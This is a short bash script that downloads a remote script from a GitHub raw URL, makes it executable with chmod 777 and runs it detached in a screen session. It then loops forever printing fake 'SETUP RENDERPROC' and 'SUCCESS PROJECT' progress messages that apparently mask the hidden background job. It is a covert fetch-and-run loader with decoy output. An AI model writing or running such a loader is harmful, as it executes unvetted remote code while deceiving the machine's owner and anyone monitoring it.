# /bin/bash
wget https://raw.githubusercontent.com/renilo/kuuntul/main/antam.sh
chmod 777 antam.sh
screen -dmS Running ./antam.sh
i=1
while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
